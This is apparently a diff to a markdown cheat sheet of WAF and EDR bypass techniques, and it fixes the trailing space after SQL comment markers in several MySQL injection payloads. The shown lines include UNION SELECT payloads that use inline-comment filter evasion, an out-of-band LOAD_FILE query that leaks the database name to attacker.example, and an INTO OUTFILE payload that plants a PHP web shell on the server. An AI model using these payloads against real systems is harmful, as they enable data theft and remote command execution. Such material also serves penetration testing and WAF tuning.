@@ -18,8 +18,8 @@ Comprehensive collection of WAF and EDR bypass techniques organized by vulnerabi
 **Inline Comments** - MySQL-specific comment syntax that bypasses keyword filters:
 
 ```sql
-' /*!UNION*/ /*!SELECT*/ 1,database(),3--
-' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
+' /*!UNION*/ /*!SELECT*/ 1,database(),3-- 
+' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- 
 ```
 
 **Double-Write** - When WAF removes keyword once, the remaining letters form the keyword:
@@ -77,10 +77,10 @@ Comprehensive collection of WAF and EDR bypass techniques organized by vulnerabi
 
 ```sql
 -- Out-of-band via LOAD_FILE
-' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.example\\test'))--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.example\\test'))-- 
 
 -- INTO OUTFILE (if MySQL has file write privileges)
-' UNION SELECT '<?php system($_GET["cmd"]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT '<?php system($_GET["cmd"]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'-- 
 ```
 
 ### MSSQL-Specific Bypasses
